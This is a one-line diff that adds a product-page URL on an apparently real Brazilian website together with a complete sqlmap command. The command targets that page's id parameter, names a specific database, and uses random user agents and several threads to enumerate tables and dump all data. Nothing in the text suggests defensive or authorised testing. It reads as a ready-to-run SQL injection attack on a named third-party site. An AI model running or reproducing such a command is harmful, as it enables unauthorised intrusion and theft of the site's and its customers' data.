@@ -1,0 +1,1 @@
+http://www.celtsat.com.br/produto_view.php?id=67 (GET)  # sqlmap.py -u http://www.celtsat.com.br/produto_view.php?id=67 -D site1373028518 --threads 5 -v3 --random-agent --tables --dump-all
